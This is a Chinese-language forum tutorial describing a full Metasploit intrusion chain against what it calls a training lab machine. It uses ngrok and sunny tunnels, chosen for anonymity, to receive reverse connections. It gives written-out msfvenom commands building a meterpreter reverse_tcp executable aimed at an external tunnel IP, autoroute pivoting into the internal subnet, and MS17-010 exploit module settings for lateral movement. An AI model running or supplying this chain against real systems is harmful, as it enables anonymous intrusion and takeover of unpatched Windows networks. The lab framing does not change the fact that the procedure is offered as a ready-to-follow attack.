前言：该机器为某个其他培训机构的靶机，说实话在这里没炫耀啥，只是给各位学习Ms17010的同学指一条路，我原先也折腾这玩意儿好久，但是就是不行，最近才找到了出路，所以多写两篇文章，把各种需要注意的地方，一步，一步写清楚，文章如果看不懂？那写出来的意义何在？

ngrok与sunny都是匿名的好东西，此次攻击全程在kali下面完成，无需公网，并且使用的代理转发，都是一次性，So？下面开始

> > 准备工作
>
>  
>  
>

1.Kali一台

2.ngrok账户注册：<https://dashboard.ngrok.com/user/signup>

3.sunny账户注册：<https://www.ngrok.cc/>

> 开始操作

1.开启Kali并且运行Msf

2.注册账户<https://dashboard.ngrok.com/user/signup>（用谷歌账户，或者git账户登陆就行了。）

![image.png](https://image.3001.net/images/20180517/15265409242368.png!small)

下载:<https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip>

然后解压得到：

![image.png](https://image.3001.net/images/20180517/15265409474752.png!small)  

接着。

![image.png](https://image.3001.net/images/20180517/15265409632381.png!small)

红色圈中填写就是

![image.png](https://image.3001.net/images/20180517/15265409793489.png!small)  

填写好了之后，回车，自动生成了一个 yml 的配置文件。

接着开始转发：

[HTML] [color=rgb(51, 102, 153) !important]纯文本查看 [color=rgb(51, 102, 153)
!important]复制代码

[backcolor=white !important][color=white !important][color=white
!important][?](https://www.chinacycc.com/#)

  
![image.png](https://image.3001.net/images/20180517/15265409971907.png!small)  

得到了之后我们继续下一个 sunny的。

（PS：这里解释一下，我们目前需要两个端口转发工具的原因就是因为ngrok不支持同时转发两个，因为要 付费 付费
付费。所以我们需要sunny来弄，但是也需要10块钱！！！！）

然后 sunny的用法。

1.购买

![image.png](https://image.3001.net/images/20180517/1526541006570.png!small)  

2.结果

设置

本地转发地址：127.0.0.1

本地转发端口：4444

![image.png](https://image.3001.net/images/20180517/15265410149569.png!small)  

3.下载

http://hls.ctopus.com/sunny/linux_amd64.zip

一般都安装的 Kali 64位吧？就上面那个下载

解压后得到

  
![image.png](https://image.3001.net/images/20180517/15265410219222.png!small)  

4.运行

./sunny cilentid 隧道ID（就上图黑色部分那个）

5.结果

  
![image.png](https://image.3001.net/images/20180517/15265410323852.png!small)  

开始正式渗透：

当前进程：

转发内网6666端口到外网

转发内网4444端口到外网

> 正式工作

ping ngrok的IP

![image.png](https://image.3001.net/images/20180517/15265410382846.png!small)  

得到了这个IP：52.14.61.47（记得，不要关闭了ngrok，一旦关闭IP和端口又会改变。匿名性较高。）

  
![image.png](https://image.3001.net/images/20180517/15265410466051.png!small)  

端口，下面要填写的

然后msf生成木马

msf[VENOM](http://www.ichunqiu.com/course/293?bbs) -p
windows/meterpreter/reverse_tcp LHOST=填写ngrok的IP地址就上面的 LPORT=这里填写ngrok后面的端口 -f
exe > /var/www/html/4444.exe

完成之后的格式

msfvenom -p windows/meterpreter/reverse_tcp LHOST=52.14.61.47 LPORT=15838 -f
exe > /var/www/html/4444.exe

shell端上传运行4444.exe

结果图

![image.png](https://image.3001.net/images/20180517/15265410535054.png!small)  

得到了shell之后，我们看一下当前权限

![image.png](https://image.3001.net/images/20180517/15265410645066.png!small)  

NT AUTHORITY\NETWORK SERVICE（User权限）

现在跟着下面步骤走：

第一步：run get_local_subnets（获取当前的路由）

![image.png](https://image.3001.net/images/20180517/15265410717289.png!small)  

Local subnet: 10.0.0.0/255.0.0.0

Local subnet: 169.254.0.0/255.255.0.0

第二步：run autoroute -s 10.0.0.0 -n 255.0.0.0（添加路由地址）

![image.png](https://image.3001.net/images/20180517/15265410808266.png!small)第三步：run
autoroute -p（查看是否添加成功）  

![image.png](https://image.3001.net/images/20180517/15265411289401.png!small)  

第四步：

background（置当前sessions到后台，我们去调用payload）

use exploit/windows/smb/ms17_010_p**ec（因为这台服务器是 Windows
2003所以要用这个，如果是2008和win7，则用下面）

use exploit/windows/smb/ms17_010_eternalblue（适用 Windows 2008 Windows 7）

![image.png](https://image.3001.net/images/20180517/15265411419233.png!small)  

第五步：sessions l 然后 sessions 3（刚才background到了后台的shell用sessions重新调出来）  

  

第六步：ipconfig（查看当前服务器的内网IP）

![image.png](https://image.3001.net/images/20180517/15265411681246.png!small)  

然后：ctrl+c 输入 Y 退出shell模式。

再输入：background 调到后台

第七步：set rhost 内网IP（设置要攻击的IP地址）

![image.png](https://image.3001.net/images/20180517/15265411781564.png!small)

第八步：这回要用到sunny。（按照上面的ngrok一样，ping出IP地址，然后得到后面的端口）  

![image.png](https://image.3001.net/images/20180517/15265411913612.png!small)  

接着回到咋们的msf

set payload windows/meterpreter/reverse_tcp

set lhost ping出来的IP（这里填写的不是ngrok的，是sunny的ping出来的IP地址）

![image.png](https://image.3001.net/images/20180517/15265412037169.png!small)  

set lport sunny的外网端口  

![image.png](https://image.3001.net/images/20180517/15265412186722.png!small)最终结果  

![image.png](https://image.3001.net/images/20180517/15265412327015.png!small)  

第九步：新开一个msf窗口，（用来接返回的shell）

lhost本地IP：127.0.0.1

监听端口：6666

  

第十步：回到刚才msf窗口，。

执行：exploit（开始攻击）

  

可以看到，攻击机这边提示没有获取到session，但是我们的另外一个msf缺接收到了shell  

![image.png](https://image.3001.net/images/20180517/15265412696091.png!small)

有问题大家可以留言哦，也欢迎大家到春秋论坛中来耍一耍
[>>>点击跳转](https://bbs.ichunqiu.com/portal.php?from=beef)  

